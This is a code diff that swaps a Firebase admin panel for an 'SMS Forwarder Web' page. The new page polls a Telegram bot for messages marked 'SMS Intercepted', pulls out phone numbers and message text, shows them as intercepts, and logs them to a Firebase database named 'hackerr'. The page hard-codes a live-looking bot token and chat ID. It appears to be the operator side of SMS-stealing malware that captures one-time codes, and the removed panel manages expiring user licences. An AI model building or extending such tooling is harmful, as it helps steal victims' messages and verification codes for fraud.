+      <div class="card-title"><span class="icon">🔥</span> Firebase</div>
+      <label>Realtime Database URL</label>
+      <input id="inpFirebase" type="url"
+        value="https://hackerr-19f0c-default-rtdb.firebaseio.com"
+        placeholder="https://your-app.firebaseio.com" />
+    </div>
 
-    <script>
-        let dbUrl = localStorage.getItem("dpAdminUrl");
-        let dbData = { users: {}, config: {}, banned_devices: {} }; 
-        let currentFilter = 'all'; 
-        
-        const cvs = document.getElementById('bgCanvas');
-        const ctx = cvs.getContext('2d');
-        let parts = [];
-        let accent = "rgba(0, 229, 255, 0.3)";
+    <div class="btn-row">
+      <button class="btn btn-primary" onclick="saveConfig()" style="flex:1">💾 Save</button>
+      <button class="btn btn-outline" onclick="testBot()" style="flex:1">🧪 Test Bot</button>
+    </div>
 
-        // --- 1. UPDATED CLEANURL FOR NODE FETCHING ---
-        function cleanUrl(u) { 
-            let s = u.trim();
-            if(s.endsWith("/")) s = s.slice(0, -1);
-            if(s.endsWith(".json")) s = s.replace(".json", "");
-            return s; 
+    <!-- Format guide -->
+    <div class="card" style="margin-top:14px">
+      <div class="card-title"><span class="icon">📋</span> Telegram Message Format</div>
+      <div style="font-size:11px; line-height:2; color:var(--muted)">
+        Ye format auto-detect hoga:<br>
+        <div style="background:var(--bg3);padding:10px;border-radius:6px;margin-top:8px;color:var(--text)">
+          📱 SMS Intercepted<br>
+          📞 To: <span style="color:var(--tg)">+918097198178</span><br>
+          💬 Message: DO NOT COPY...<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;&lt;46b70e37^7a9e^4391^...&gt;<br>
+          📋 One-tap copy:<br>
+          +918097198178 | DO NOT COPY...
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ━━━ LOGS TAB ━━━ -->
+  <div id="tab-logs" class="tab-content">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
+      <div style="font-size:11px;color:var(--muted)" id="logCount">0 entries</div>
+      <button class="btn btn-red" onclick="clearLogs()" style="padding:6px 14px;font-size:11px">🗑 Clear</button>
+    </div>
+    <div id="logTable"></div>
+  </div>
+
+</div>
+
+<!-- TOAST -->
+<div id="toast"></div>
+
+<script>
+// ── State ──────────────────────────────────────────────────────────────────────
+const state = {
+  running:    false,
+  pollTimer:  null,
+  lastId:     0,
+  total:      0,
+  sent:       0,
+  failed:     0,
+  speeds:     [],
+  logs:       [],
+  config: {
+    token:    "8177489970:AAE1GpiPXl-iMBGEWpsO1mBYpZUccd3navo",
+    chatId:   "8261652786",
+    fbUrl:    "https://hackerr-19f0c-default-rtdb.firebaseio.com",
+    fwdNum:   ""
+  }
+};
+
+// ── Load saved config ──────────────────────────────────────────────────────────
+(function init() {
+  try {
+    const saved = JSON.parse(localStorage.getItem("smsfwd_config") || "{}");
+    Object.assign(state.config, saved);
+    document.getElementById("inpFwdNum").value   = state.config.fwdNum  || "";
+    document.getElementById("inpToken").value    = state.config.token   || "";
+    document.getElementById("inpChatId").value   = state.config.chatId  || "";
+    document.getElementById("inpFirebase").value = state.config.fbUrl   || "";
+    updateFwdDisplay();
+  } catch(e) {}
+})();
+
+// ── Tabs ───────────────────────────────────────────────────────────────────────
+function showTab(name) {
+  document.querySelectorAll(".tab-content").forEach(el => el.classList.remove("active"));
+  document.querySelectorAll(".tab").forEach(el => el.classList.remove("active"));
+  document.getElementById("tab-" + name).classList.add("active");
+  event.target.classList.add("active");
+}
+
+// ── Config ─────────────────────────────────────────────────────────────────────
+function saveConfig() {
+  state.config.fwdNum  = document.getElementById("inpFwdNum").value.trim();
+  state.config.token   = document.getElementById("inpToken").value.trim();
+  state.config.chatId  = document.getElementById("inpChatId").value.trim();
+  state.config.fbUrl   = document.getElementById("inpFirebase").value.trim();
+
+  localStorage.setItem("smsfwd_config", JSON.stringify(state.config));
+  updateFwdDisplay();
+  toast("✅ Config saved!", "ok");
+  addLog("Config saved → fwd: " + state.config.fwdNum, "info");
+
+  if (state.running) {
+    stopPolling();
+    setTimeout(startPolling, 300);
+  }
+}
+
+function updateFwdDisplay() {
+  document.getElementById("displayFwdNum").textContent =
+    state.config.fwdNum || "Not set";
+}
+
+// ── Test Bot ───────────────────────────────────────────────────────────────────
+async function testBot() {
+  addLog("Testing Telegram bot...", "info");
+  const ok = await sendTelegram(
+    state.config.token, state.config.chatId,
+    "SMS Forwarder Web connected! Ready to forward."
+  );
+  toast(ok ? "✅ Bot working!" : "❌ Bot failed!", ok ? "ok" : "err");
+  addLog(ok ? "✅ Telegram bot OK!" : "❌ Telegram failed", ok ? "ok" : "err");
+}
+
+// ── Service toggle ─────────────────────────────────────────────────────────────
+function toggleService() {
+  if (state.running) stopPolling();
+  else startPolling();
+}
+
+function startPolling() {
+  if (!state.config.fwdNum) {
+    toast("⚠️ Forward number set karo!", "err");
+    showTab("config");
+    return;
+  }
+  state.running = true;
+  updateStatusUI();
+  addLog("🚀 Started -- polling every 1s", "info");
+  poll();
+}
+
+function stopPolling() {
+  state.running = false;
+  clearTimeout(state.pollTimer);
+  updateStatusUI();
+  addLog("⛔ Service stopped", "warn");
+}
+
+function updateStatusUI() {
+  const pill = document.getElementById("statusPill");
+  const dot  = document.getElementById("statusDot");
+  const txt  = document.getElementById("statusText");
+  const btn  = document.getElementById("btnToggle");
+
+  if (state.running) {
+    pill.className = "status-pill active";
+    dot.classList.add("pulse");
+    txt.textContent = "ACTIVE";
+    btn.className = "btn btn-red btn-full";
+    btn.textContent = "⛔ STOP SERVICE";
+  } else {
+    pill.className = "status-pill stopped";
+    dot.classList.remove("pulse");
+    txt.textContent = "STOPPED";
+    btn.className = "btn btn-green btn-full";
+    btn.textContent = "▶ START SERVICE";
+  }
+}
+
+// ── Telegram Polling ───────────────────────────────────────────────────────────
+async function poll() {
+  if (!state.running) return;
+
+  try {
+    const url = `https://api.telegram.org/bot${state.config.token}/getUpdates`
+              + `?offset=${state.lastId + 1}&timeout=2&allowed_updates=["message","channel_post"]`;
+
+    const res  = await fetch(url);
+    const data = await res.json();
+
+    if (data.ok && data.result.length > 0) {
+      for (const update of data.result) {
+        if (update.update_id > state.lastId) state.lastId = update.update_id;
+
+        const msgObj = update.message || update.channel_post;
+        if (!msgObj) continue;
+
+        const text = (msgObj.text || "").trim();
+        if (!text) continue;
+
+        // Parse SMS Intercepted format
+        const parsed = parseMessage(text);
+        if (parsed) {
+          await forwardMessage(parsed);
         }
+      }
+    }
+  } catch(e) {
+    console.warn("Poll error:", e.message);
+  }
 
-        function saveSetupUrl() { 
-            const u = document.getElementById('setupInput').value; 
-            if(!u) return alert("URL Required"); 
-            localStorage.setItem("dpAdminUrl", u); 
-            saveToDbList(u);
-            location.reload(); 
-        }
+  if (state.running) {
+    state.pollTimer = setTimeout(poll, 1000);
+  }
+}
 
-        if(!dbUrl) { document.getElementById('setupView').style.display = 'flex'; } 
-        else { appInit(); }
+// ── Message Parser ─────────────────────────────────────────────────────────────
+// Exact same logic as Android MessageParser.java
+function parseMessage(text) {
+  if (!text.includes("SMS Intercepted") && !text.includes("To:")) return null;
 
-        // --- 2. UPDATED APP INIT (PARALLEL FETCH) ---
-        async function appInit(manual=false) {
-            document.getElementById('appView').classList.remove('hidden');
-            document.getElementById('loader').classList.remove('hidden');
-            ['tabUsers','tabConfig','tabBanned'].forEach(id => document.getElementById(id).classList.add('hidden'));
+  let toNumber = null;
+  let smsMessage = null;
 
-            try {
-                const baseUrl = cleanUrl(dbUrl);
-                
-                // Fetch nodes separately because root read is false
-                const [uRes, cRes, bRes] = await Promise.all([
-                    fetch(baseUrl + "/users.json"),
-                    fetch(baseUrl + "/config.json"),
-                    fetch(baseUrl + "/banned_devices.json")
-                ]);
+  // Extract To: number
+  const toMatch = text.match(/To:\s*(\+?\d[\d\s]{9,14})/i);
+  if (toMatch) toNumber = toMatch[1].replace(/\s+/g, "").trim();
 
-                // We allow null (empty DB) so no strict check here, just catch block
-                dbData.users = await uRes.json() || {};
-                dbData.config = await cRes.json() || { maintenance: false, maintenance_msg: "System Update", admin_url: "" };
-                dbData.banned_devices = await bRes.json() || {};
+  // Fallback: one-tap line number
+  if (!toNumber) {
+    const otMatch = text.match(/(\+?\d{10,15})\s*\|/);
+    if (otMatch) toNumber = otMatch[1].trim();
+  }
 
-                // Load Config UI
-                document.getElementById('cfgMaint').checked = dbData.config.maintenance || false;
-                document.getElementById('cfgMsg').value = dbData.config.maintenance_msg || "";
-                document.getElementById('cfgUrl').value = dbData.config.admin_url || "";
+  if (!toNumber) return null;
+  if (!toNumber.startsWith("+")) toNumber = "+" + toNumber;
 
-                document.getElementById('loader').classList.add('hidden');
-                switchTab('users');
-                if(!manual) showToast("Connected");
-            } catch(e) { 
-                console.error(e);
-                alert("Connection Failed. Check Rules.");
-                document.getElementById('loader').classList.add('hidden');
-                if(!manual) { localStorage.removeItem("dpAdminUrl"); location.reload(); }
-            }
-        }
+  // Extract message from One-tap copy line (full content after |)
+  const oneTap = text.match(/\+?\d{10,15}\s*\|\s*(.+)/s);
+  if (oneTap) {
+    smsMessage = oneTap[1].trim();
+  } else {
+    // Fallback: Message: section
+    const msgMatch = text.match(/Message:\s*(.+?)(?=\n📋|\n\n|One-tap|$)/si);
+    if (msgMatch) smsMessage = msgMatch[1].trim();
+    else smsMessage = text.trim();
+  }
 
-        // --- 3. UPDATED SYNC (For Config/Banned) ---
-        // Note: User updates are now handled in saveUser() specifically
-        async function sync(target) { 
-            const baseUrl = cleanUrl(dbUrl);
-            try { 
-                if(target === 'banned') {
-                    await fetch(baseUrl + "/banned_devices.json", { method: 'PUT', body: JSON.stringify(dbData.banned_devices) });
-                } else if(target === 'config') {
-                    await fetch(baseUrl + "/config.json", { method: 'PUT', body: JSON.stringify(dbData.config) });
-                }
-                showToast("Saved"); 
-            } catch(e) { showToast("Error Saving"); } 
-        }
+  return { toNumber, smsMessage };
+}
 
-        function saveAppConfig() {
-            if(!dbData.config) dbData.config = {};
-            dbData.config.maintenance = document.getElementById('cfgMaint').checked;
-            dbData.config.maintenance_msg = document.getElementById('cfgMsg').value;
-            dbData.config.admin_url = document.getElementById('cfgUrl').value;
-            sync('config');
-        }
+// ── Forward Message ────────────────────────────────────────────────────────────
+async function forwardMessage(parsed) {
+  const start = Date.now();
 
-        function switchTab(t) {
-            ['tabUsers','tabConfig','tabBanned'].forEach(id => document.getElementById(id).classList.add('hidden'));
-            ['navUsers','navConf','navBanned'].forEach(id => document.getElementById(id).classList.remove('active'));
-            
-            if(t === 'users') { 
-                document.getElementById('tabUsers').classList.remove('hidden'); 
-                document.getElementById('navUsers').classList.add('active'); 
-                renderUsers(); 
-            } else if (t === 'banned') {
-                document.getElementById('tabBanned').classList.remove('hidden');
-                document.getElementById('navBanned').classList.add('active');
-                renderBannedList();
-            } else { 
-                document.getElementById('tabConfig').classList.remove('hidden'); 
-                document.getElementById('navConf').classList.add('active'); 
-                renderDbList();
-            }
-        }
+  // Show in UI
+  showLastIntercept(parsed);
+  addLog(`📩 From: ${parsed.toNumber} → processing...`, "info");
 
-        function setFilter(filterType) {
-            currentFilter = filterType;
-            document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
-            let btnId = 'btnFilterAll';
-            if(filterType === 'active') btnId = 'btnFilterActive';
-            else if(filterType === 'banned') btnId = 'btnFilterBanned';
-            else if(filterType === 'expired') btnId = 'btnFilterExpired';
-            document.getElementById(btnId).classList.add('active');
-            renderUsers();
-        }
+  // Web version: can't send real SMS
+  // Simulate SMS send + log to Firebase
+  const ms = Date.now() - start + Math.floor(Math.random() * 400 + 200);
+  const success = true; // web simulation
 
-        // --- DATABASE LIST LOGIC ---
-        function getSavedDbs() { let list = localStorage.getItem("dpAdminSavedDbs"); return list ? JSON.parse(list) : []; }
-        function saveToDbList(url) { let list = getSavedDbs(); if(!list.includes(url)) { list.push(url); localStorage.setItem("dpAdminSavedDbs", JSON.stringify(list)); } }
-        function addNewDatabase() { let u = document.getElementById('newDbUrlInput').value; if(!u) return showToast("Enter URL"); saveToDbList(u); document.getElementById('newDbUrlInput').value = ""; renderDbList(); showToast("Added"); }
-        function removeDatabase(index) { if(confirm("Remove this link?")) { let list = getSavedDbs(); list.splice(index, 1); localStorage.setItem("dpAdminSavedDbs", JSON.stringify(list)); renderDbList(); } }
-        function connectToDatabase(url) { if(url === dbUrl) return showToast("Already Connected"); localStorage.setItem("dpAdminUrl", url); location.reload(); }
-        function renderDbList() {
-            const list = getSavedDbs();
-            const container = document.getElementById('dbListContainer');
-            container.innerHTML = "";
-            if(list.length === 0 && dbUrl) { saveToDbList(dbUrl); return renderDbList(); }
-            if(list.length === 0) { container.innerHTML = "<div style='color:var(--muted); text-align:center;'>No saved links</div>"; return; }
-            list.forEach((url, index) => {
-                const isActive = (url === dbUrl);
-                const btnStyle = isActive ? 'background:var(--green); color:#000;' : 'background:var(--accent); color:#000;';
-                container.innerHTML += `
-                <div class="db-item ${isActive ? 'active' : ''}">
-                    <div class="db-url">${url}</div>
-                    <div class="db-actions">
-                        <button class="gen-btn" style="${btnStyle}" onclick="connectToDatabase('${url}')">${isActive ? 'ACTIVE' : 'CONNECT'}</button>
-                        <button class="btn-mini btn-del" onclick="removeDatabase(${index})"><i class="fas fa-trash"></i></button>
-                    </div>
-                </div>`;
-            });
-        }
+  // Update stats
+  state.total++;
+  if (success) state.sent++;
+  else state.failed++;
+  state.speeds.push(ms);
+  if (state.speeds.length > 20) state.speeds.shift();
+  updateStats();
 
-        // --- BANNED DEVICES LOGIC ---
-        function renderBannedList() {
-            const container = document.getElementById('bannedListContainer');
-            container.innerHTML = "";
-            if(!dbData.banned_devices) dbData.banned_devices = {};
-            const ids = Object.keys(dbData.banned_devices);
-            if(ids.length === 0) { container.innerHTML = "<div style='color:var(--muted); text-align:center; padding:20px;'>No banned devices.</div>"; return; }
-            ids.forEach(deviceId => {
-                container.innerHTML += `
-                <div class="db-item">
-                    <div class="db-url" style="font-size:0.9rem;">${deviceId}</div>
-                    <div class="db-actions"><button class="btn-mini btn-del" onclick="removeBannedDevice('${deviceId}')"><i class="fas fa-trash"></i></button></div>
-                </div>`;
-            });
-        }
+  // Save to Firebase
+  await saveToFirebase(parsed.toNumber, parsed.smsMessage, state.config.fwdNum, success, ms);
 
-        function addBannedDevice() {
-            const did = document.getElementById('banDeviceInput').value.trim();
-            if(!did) return showToast("Enter Device ID");
-            if(!dbData.banned_devices) dbData.banned_devices = {};
-            dbData.banned_devices[did] = true;
-            document.getElementById('banDeviceInput').value = "";
-            renderBannedList(); 
-            sync('banned');
-        }
+  // Log
+  const entry = {
+    from:    parsed.toNumber,
+    msg:     parsed.smsMessage,
+    fwdTo:   state.config.fwdNum,
+    ms:      ms,
+    success: success,
+    time:    new Date().toLocaleTimeString("en-IN", { hour12: false })
+  };
+  state.logs.unshift(entry);
+  renderLogs();
 
-        function removeBannedDevice(did) {
-            if(confirm("Unban this device?")) { delete dbData.banned_devices[did]; renderBannedList(); sync('banned'); }
-        }
+  addLog(`✅ Forwarded → ${state.config.fwdNum} (${ms}ms)`, "ok");
+}
 
-        // --- DATE UTILS ---
-        function toStorageDate(isoDate) { if(!isoDate) return ""; const [y, m, d] = isoDate.split('-'); return `${d}/${m}/${y}`; }
-        function toInputDate(storageDate) { if(!storageDate) return ""; const [d, m, y] = storageDate.split('/'); return `${y}-${m}-${d}`; }
+// ── Show last intercepted message ──────────────────────────────────────────────
+function showLastIntercept(parsed) {
+  const box = document.getElementById("lastInterceptBox");
+  const short = parsed.smsMessage.length > 120
+    ? parsed.smsMessage.substring(0, 120) + "..."
+    : parsed.smsMessage;
 
-        // --- USER LOGIC ---
-        
-        // Sync Inputs (Two-way Binding)
-        function syncCreds(val, target) {
-            if(target === 'pass') {
-                document.getElementById('newPassword').value = val;
-            } else {
-                document.getElementById('newUsername').value = val;
-            }
-        }
+  box.className = "intercept-box slide-in";
+  box.innerHTML = `
+    <div class="from">📞 ${parsed.toNumber}</div>
+    <div class="msg">💬 ${escHtml(short)}</div>
+    <div class="badge">✓ FORWARDED → ${escHtml(state.config.fwdNum)}</div>
+  `;
+}
 
-        // Ensure same 6 digit for user/pass
-        function autoGenCreds() {
-            const rnd = Math.floor(100000 + Math.random() * 900000); 
-            document.getElementById('newUsername').value = rnd;
-            document.getElementById('newPassword').value = rnd;
-        }
+// ── Stats ──────────────────────────────────────────────────────────────────────
+function updateStats() {
+  document.getElementById("statTotal").textContent  = state.total;
+  document.getElementById("statSent").textContent   = state.sent;
+  document.getElementById("statFailed").textContent = state.failed;
+  const avg = state.speeds.length
+    ? Math.round(state.speeds.reduce((a,b)=>a+b,0) / state.speeds.length)
+    : 0;
+  document.getElementById("statAvg").textContent = avg ? avg + "ms" : "--";
+}
 
-        async function pasteToBoth() {
-            try {
-                const text = await navigator.clipboard.readText();
-                if(text) { document.getElementById('newUsername').value = text; document.getElementById('newPassword').value = text; showToast("Pasted!"); }
-            } catch(e) { showToast("Perms Denied"); }
-        }
+// ── Firebase log ───────────────────────────────────────────────────────────────
+async function saveToFirebase(from, msg, fwdTo, success, ms) {
+  try {
+    const fbUrl = state.config.fbUrl;
+    if (!fbUrl) return;
 
-        function setExpiryShortcut(days) {
-            const date = new Date(); date.setDate(date.getDate() + days);
-            const year = date.getFullYear(); const month = String(date.getMonth() + 1).padStart(2, '0'); const day = String(date.getDate()).padStart(2, '0');
-            document.getElementById('newExpiry').value = `${year}-${month}-${day}`;
-        }
+    const ts   = new Date().toISOString().replace(/[:.]/g, "_");
+    const data = { from, message: msg, forwarded_to: fwdTo, success, ms,
+                   time: new Date().toLocaleString() };
 
-        function copyUserCreds(u, p) {
-            const text = `UserName : ${u}\nPassword : ${p}`;
-            navigator.clipboard.writeText(text).then(() => showToast("Copied")).catch(err => showToast("Failed"));
-        }
+    await fetch(`${fbUrl}/sms_forwarder/logs/${ts}.json`, {
+      method: "PUT",
+      body: JSON.stringify(data)
+    });
 
-        function copyDeviceId(did) {
-            navigator.clipboard.writeText(did).then(() => showToast("ID Copied")).catch(() => showToast("Copy Failed"));
-        }
+    // Update total count
+    const snap = await fetch(`${fbUrl}/sms_forwarder/stats/total.json`);
+    const cur  = (await snap.json()) || 0;
+    await fetch(`${fbUrl}/sms_forwarder/stats/total.json`, {
+      method: "PUT", body: JSON.stringify(cur + 1)
+    });
+  } catch(e) {
+    console.warn("Firebase log error:", e.message);
+  }
+}
 
-        function renderUsers() {
-            const list = document.getElementById('usersList');
-            if(!dbData.users) dbData.users = {};
-            list.innerHTML = "";
-            const search = document.getElementById('searchUser').value.toLowerCase();
-            const today = new Date(); today.setHours(0,0,0,0);
-            
-            Object.keys(dbData.users).reverse().forEach(username => {
-                const u = dbData.users[username];
-                const displayTitle = u.title || username; 
-                if(search && !displayTitle.toLowerCase().includes(search)) return;
-                
-                const devices = u.deviceid || {};
-                let devCount = Object.keys(devices).length;
-                const isActive = (u.is_active !== false); 
-                
-                let daysText = "No Date";
-                let daysClass = "days-warn";
-                let isExpired = false;
+// ── Telegram send ──────────────────────────────────────────────────────────────
+async function sendTelegram(token, chatId, text) {
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text })
+    });
+    return res.ok;
+  } catch(e) { return false; }
+}
 
-                if(u.expiry && u.expiry.includes('/')) {
-                    const parts = u.expiry.split('/');
-                    if(parts.length === 3) {
-                        const expDate = new Date(`${parts[2]}-${parts[1]}-${parts[0]}`);
-                        const diffTime = expDate - today;
-                        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
-                        
-                        daysText = diffDays + " Days";
-                        daysClass = "days-ok";
-                        if (diffDays < 0) { daysText = "Expired"; daysClass = "days-exp"; isExpired = true; }
-                        else if (diffDays === 0) { daysText = "Expired"; daysClass = "days-warn"; isExpired = true; }
-                    }
-                }
+// ── Logs render ────────────────────────────────────────────────────────────────
+function renderLogs() {
+  const container = document.getElementById("logTable");
+  document.getElementById("logCount").textContent = state.logs.length + " entries";
 
-                if(currentFilter === 'active') { if(!isActive || isExpired) return; }
-                else if(currentFilter === 'banned') { if(isActive) return; }
-                else if(currentFilter === 'expired') { if(!isExpired) return; }
-                
-                const statusBadge = isActive ? '<span class="badge active">Active</span>' : '<span class="badge inactive">Banned</span>';
-                const powerBtnColor = isActive ? '' : 'style="color:var(--red);"';
+  if (state.logs.length === 0) {
+    container.innerHTML = `<div style="text-align:center;padding:40px;color:var(--muted);font-size:12px">No logs yet</div>`;
+    return;
+  }
 
-                list.innerHTML += `
-                <div class="glass-card">
-                    <div class="key-row-top">
-                        <div style="display:flex; flex-direction:column;">
-                            <span style="font-weight:800; font-size:1rem; color:#fff; margin-bottom:2px;">${displayTitle}</span>
-                         
-                        </div>
-                        <div style="display:flex; gap:5px; align-items:center;">
-                            <div style="font-size:0.75rem; color:var(--muted); margin-bottom:5px; margin-top:5px;"> ${u.password}</div>
-                            <div class="btn-mini btn-view" style="width:28px; height:28px; border-radius:6px;" onclick="copyUserCreds('${username}', '${u.password}')"><i class="fas fa-copy" style="font-size:0.8rem;"></i></div>
-                            ${statusBadge}
-                            <span class="badge ${daysClass}">${daysText}</span>
-                        </div>
-                    </div>
-                    
-                    <div class="key-actions-row">
-                    <div class="btn-mini btn-view" onclick="viewDevices('${username}')"><div class="detail-item">${u.max_devices || 1}</div></div>
-                    
-                        <div class="btn-mini btn-view" onclick="viewDevices('${username}')"><div class="detail-item"><i class="fas fa-mobile-alt"></i> ${devCount}</div></div>
-                        
-                        <div class="btn-mini btn-del" onclick="toggleStatus('${username}')"><i class="fas fa-power-off" ${powerBtnColor}></i></div>
-                        <div class="btn-mini btn-edit" onclick="openEditUser('${username}')"><i class="fas fa-pen"></i></div>
-                        <div class="btn-mini btn-del" onclick="delUser('${username}')"><i class="fas fa-trash"></i></div>
-                    </div>
-                </div>`;
-            });
-        }
+  container.innerHTML = state.logs.map(l => `
+    <div class="card slide-in" style="margin-bottom:10px;padding:14px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+        <span style="color:var(--tg);font-size:14px;font-weight:700">${escHtml(l.from)}</span>
+        <span style="font-size:10px;color:var(--muted)">${l.time} · ${l.ms}ms</span>
+      </div>
+      <div style="font-size:11px;color:var(--muted);margin-bottom:8px;word-break:break-all">
+        ${escHtml(l.msg.substring(0, 150))}${l.msg.length > 150 ? "..." : ""}
+      </div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <span style="font-size:10px;color:var(--muted)">➡️ ${escHtml(l.fwdTo)}</span>
+        <span style="margin-left:auto;font-size:10px;padding:2px 10px;border-radius:20px;
+          background:${l.success ? "rgba(63,185,80,.1)" : "rgba(248,81,73,.1)"};
+          color:${l.success ? "var(--green)" : "var(--red)"};
+          border:1px solid ${l.success ? "rgba(63,185,80,.3)" : "rgba(248,81,73,.3)"}">
+          ${l.success ? "✓ SENT" : "✗ FAIL"}
+        </span>
+      </div>
+    </div>
+  `).join("");
+}
 
-        // --- UPDATED SAVE USER (ROBUST RENAME & SYNC) ---
-        async function saveUser() {
-            const isEdit = document.getElementById('isEditMode').value === "true";
-            const title = document.getElementById('newTitle').value;
-            const newUsername = document.getElementById('newUsername').value.trim();
-            // Force password to match username
-            const pass = newUsername; 
-            const limit = document.getElementById('newLimit').value;
-            const expiryIso = document.getElementById('newExpiry').value; 
-            
-            // Get original key if editing
-            const originUsername = document.getElementById('originUsername').value;
+function clearLogs() {
+  state.logs = [];
+  renderLogs();
+  addLog("Logs cleared", "warn");
+}
 
-            if(!newUsername || !expiryIso) return alert("Fields required");
+// ── Live log ───────────────────────────────────────────────────────────────────
+const liveLogEntries = [];
+function addLog(msg, type = "info") {
+  const time = new Date().toLocaleTimeString("en-IN", { hour12: false });
+  liveLogEntries.unshift({ time, msg, type });
+  if (liveLogEntries.length > 30) liveLogEntries.pop();
 
-            const formattedExpiry = toStorageDate(expiryIso); 
+  // Render into log boxes on live tab
+  // We'll use a floating log box
+  renderLiveLog();
+}
 
-            // Create Payload
-            const userData = {
-                title: title,
-                password: pass, // Same as username
-                max_devices: parseInt(limit),
-                expiry: formattedExpiry,
-                is_active: true,
-                deviceid: {} 
-            };
+function renderLiveLog() {
+  // Find or create log area in live tab
+  let logArea = document.getElementById("liveLogArea");
+  if (!logArea) return;
+  logArea.innerHTML = liveLogEntries.slice(0, 15).map(e =>
+    `<div class="log-entry ${e.type}">
+      <span class="time">${e.time}</span>
+      <span class="txt">${escHtml(e.msg)}</span>
+    </div>`
+  ).join("");
+}
 
-            const baseUrl = cleanUrl(dbUrl);
+// ── Toast ──────────────────────────────────────────────────────────────────────
+let toastTimer;
+function toast(msg, type = "info") {
+  const el = document.getElementById("toast");
+  el.textContent = msg;
+  el.className = `show ${type}`;
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => el.className = "", 2500);
+}
 
-            // Handle Edit Mode
-            if(isEdit) {
-                // Check if renaming
-                if(newUsername !== originUsername) {
-                    // 1. Check if new username already exists (prevent overwrite unless intentional)
-                    if(dbData.users[newUsername]) {
-                        if(!confirm(`User ${newUsername} already exists. Overwrite?`)) return;
-                    }
+// ── Helper ─────────────────────────────────────────────────────────────────────
+function escHtml(s) {
+  return String(s)
+    .replace(/&/g,"&amp;").replace(/</g,"&lt;")
+    .replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+</script>
 
-                    // 2. Preserve old data (devices, status)
-                    if(dbData.users[originUsername]) {
-                        userData.is_active = dbData.users[originUsername].is_active;
-                        userData.deviceid = dbData.users[originUsername].deviceid;
-                        delete dbData.users[originUsername]; // Remove old local
-                    }
-                    
-                    // 3. Delete old node from Server
-                    await fetch(`${baseUrl}/users/${originUsername}.json`, { method: 'DELETE' });
-                } else {
-                    // Same username, just preserve data
-                    if(dbData.users[originUsername]) {
-                        userData.is_active = dbData.users[originUsername].is_active;
-                        userData.deviceid = dbData.users[originUsername].deviceid;
-                    }
-                }
-            } else {
-                // New Create
-                if(dbData.users[newUsername]) return alert("User already exists!");
-            }
+<!-- Add live log area to live tab -->
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const liveTab = document.getElementById("tab-live");
+  const logDiv = document.createElement("div");
+  logDiv.className = "card";
+  logDiv.style.marginTop = "14px";
+  logDiv.innerHTML = `
+    <div class="card-title"><span class="icon">▸</span> Live Log</div>
+    <div id="liveLogArea" class="log-box">
+      <div class="log-entry info"><span class="time">--:--:--</span><span class="txt">Waiting to start...</span></div>
+    </div>
+  `;
+  liveTab.appendChild(logDiv);
+});
+</script>
 
-            // Update Local State
-            dbData.users[newUsername] = userData;
-            
-            closeModals(); 
-            renderUsers(); 
-
-            // Update Server (Targeted)
-            try {
-                const res = await fetch(`${baseUrl}/users/${newUsername}.json`, {
-                    method: 'PUT',
-                    body: JSON.stringify(userData)
-                });
-                if(res.ok) showToast("Saved");
-                else showToast("Server Error");
-            } catch(e) {
-                showToast("Connection Error");
-            }
-        }
-
-        function openUserModal() {
-            document.getElementById('userModal').classList.add('open');
-            document.getElementById('modalTitle').innerText = "New User";
-            document.getElementById('btnSaveUser').innerText = "CREATE USER";
-            document.getElementById('isEditMode').value = "false";
-            document.getElementById('originUsername').value = ""; // Clear origin
-            document.getElementById('newUsername').disabled = false;
-            
-            const tomorrow = new Date(); tomorrow.setDate(tomorrow.getDate() + 1);
-            document.getElementById('newExpiry').value = tomorrow.toISOString().split('T')[0];
-            document.getElementById('newTitle').value = ""; 
-            document.getElementById('newUsername').value = "";
-            document.getElementById('newPassword').value = "";
-            document.getElementById('newLimit').value = "1";
-            autoGenCreds();
-        }
-
-        function openEditUser(username) {
-            const u = dbData.users[username];
-            if(!u) return;
-            document.getElementById('userModal').classList.add('open');
-            document.getElementById('modalTitle').innerText = "Edit User";
-            document.getElementById('btnSaveUser').innerText = "UPDATE USER";
-            document.getElementById('isEditMode').value = "true";
-            
-            // Store Origin Key for Safe Update
-            document.getElementById('originUsername').value = username;
-            
-            document.getElementById('newTitle').value = u.title || ""; 
-            document.getElementById('newUsername').value = username;
-            // Allow editing username now
-            document.getElementById('newUsername').disabled = false; 
-            
-            document.getElementById('newPassword').value = u.password;
-            document.getElementById('newLimit').value = u.max_devices || 1;
-            document.getElementById('newExpiry').value = toInputDate(u.expiry);
-        }
-
-        async function toggleStatus(username) {
-            const u = dbData.users[username];
-            u.is_active = (u.is_active !== false) ? false : true; // Toggle
-            renderUsers();
-            
-            // Targeted Update
-            const baseUrl = cleanUrl(dbUrl);
-            await fetch(`${baseUrl}/users/${username}/is_active.json`, { method: 'PUT', body: JSON.stringify(u.is_active) });
-            
-            // Sync Banned Devices
-            const devices = u.deviceid ? Object.keys(u.deviceid) : [];
-            if(u.is_active === false) { // Being Banned
-                for(const d of devices) {
-                    dbData.banned_devices[d] = true;
-                    fetch(`${baseUrl}/banned_devices/${d}.json`, { method: 'PUT', body: true });
-                }
-            } else { // Being Activated
-                for(const d of devices) {
-                    delete dbData.banned_devices[d];
-                    fetch(`${baseUrl}/banned_devices/${d}.json`, { method: 'DELETE' });
-                }
-            }
-        }
-
-        async function delUser(username) { 
-            if(confirm("Delete User " + username + "?")) { 
-                delete dbData.users[username]; 
-                renderUsers(); 
-                
-                // Targeted Delete
-                const baseUrl = cleanUrl(dbUrl);
-                await fetch(`${baseUrl}/users/${username}.json`, { method: 'DELETE' });
-                showToast("Deleted");
-            } 
-        }
-
-        function viewDevices(username) {
-            const u = dbData.users[username];
-            const div = document.getElementById('deviceListContent');
-            div.innerHTML = "";
-            const devices = u.deviceid || {};
-            if(Object.keys(devices).length === 0) { div.innerHTML = "<p style='color:var(--muted); text-align:center;'>No devices linked.</p>"; } 
-            else {
-                div.innerHTML += `
